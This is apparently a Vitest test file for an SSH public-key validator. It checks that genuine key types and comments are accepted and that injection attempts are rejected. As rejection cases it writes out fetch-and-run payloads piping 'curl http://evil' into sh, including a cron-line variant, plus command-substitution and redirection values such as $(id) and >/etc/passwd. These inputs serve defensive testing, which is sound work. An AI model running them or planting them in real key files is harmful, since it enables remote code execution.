import { describe, expect, it } from "vitest";
import { isValidSshPublicKey } from "./sshPublicKey";

const ED25519 = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHqW1p3nMuFvR5NHqhkxLQKfDVZ2VYFOxKvL8dW7dSpq user@host";
const RSA = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPk3n4Vw0mn3pQ8x1Nq== laptop";
const ECDSA = "ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTY=";

describe("isValidSshPublicKey", () => {
  it("accepts the key types the app generates and imports", () => {
    expect(isValidSshPublicKey(ED25519)).toBe(true);
    expect(isValidSshPublicKey(RSA)).toBe(true);
    expect(isValidSshPublicKey(ECDSA)).toBe(true);
    expect(isValidSshPublicKey("ssh-dss AAAAB3NzaC1kc3M=")).toBe(true);
    expect(isValidSshPublicKey("sk-ssh-ed25519@openssh.com AAAAGnNr key")).toBe(true);
  });

  it("accepts surrounding whitespace and a missing comment", () => {
    expect(isValidSshPublicKey(`  ${ED25519}\n`)).toBe(true);
    expect(isValidSshPublicKey("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5")).toBe(true);
  });

  it("rejects a remote-file payload dressed as a public key", () => {
    expect(isValidSshPublicKey("* * * * * root curl http://evil/x|sh")).toBe(false);
    expect(isValidSshPublicKey("curl http://evil/x | sh")).toBe(false);
    expect(isValidSshPublicKey("")).toBe(false);
  });

  it("rejects a second line, whatever it holds", () => {
    expect(isValidSshPublicKey(`${ED25519}\n* * * * * root curl http://evil/x|sh`)).toBe(false);
    expect(isValidSshPublicKey("ssh-ed25519\nAAAAC3NzaC1lZDI1NTE5")).toBe(false);
  });

  it("rejects shell metacharacters in the comment, which an interpreted file would run", () => {
    // ~/.ssh/rc is executed by sshd at every login: an appended line whose
    // comment carries ";" or "|" is a command, whatever the first token was.
    expect(isValidSshPublicKey(`${ED25519.split(" ").slice(0, 2).join(" ")} ; curl http://evil | sh`)).toBe(false);
    expect(isValidSshPublicKey("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 `id`")).toBe(false);
    expect(isValidSshPublicKey("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 x&whoami")).toBe(false);
    expect(isValidSshPublicKey("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 $(id)")).toBe(false);
    expect(isValidSshPublicKey("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 x>/etc/passwd")).toBe(false);
    expect(isValidSshPublicKey("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 x\\ y")).toBe(false);
    expect(isValidSshPublicKey("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 'x'")).toBe(false);
    expect(isValidSshPublicKey("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 x\x07y")).toBe(false);
  });

  it("still accepts an ordinary comment", () => {
    expect(isValidSshPublicKey("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 user@host")).toBe(true);
    expect(isValidSshPublicKey("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 kipavy@work-laptop.local")).toBe(true);
    expect(isValidSshPublicKey("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 my key 2026")).toBe(true);
  });

  it("accepts the comment shapes other tooling writes, non-ASCII included", () => {
    // An allow-list here would refuse a real .pub and only show it up months
    // later, at the deploy — the import path does not validate.
    expect(isValidSshPublicKey("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 user@host:2222")).toBe(true);
    expect(isValidSshPublicKey("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 key=prod")).toBe(true);
    expect(isValidSshPublicKey("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 rsa-key-20240101")).toBe(true);
    expect(isValidSshPublicKey("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 aurélie@serveur-privé")).toBe(true);
    expect(isValidSshPublicKey("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 键@主机")).toBe(true);
  });

  it("rejects an unknown key type and a non-base64 blob", () => {
    expect(isValidSshPublicKey("ssh-evil AAAAC3NzaC1lZDI1NTE5")).toBe(false);
    expect(isValidSshPublicKey("ssh-ed25519 $(id)")).toBe(false);
  });
});
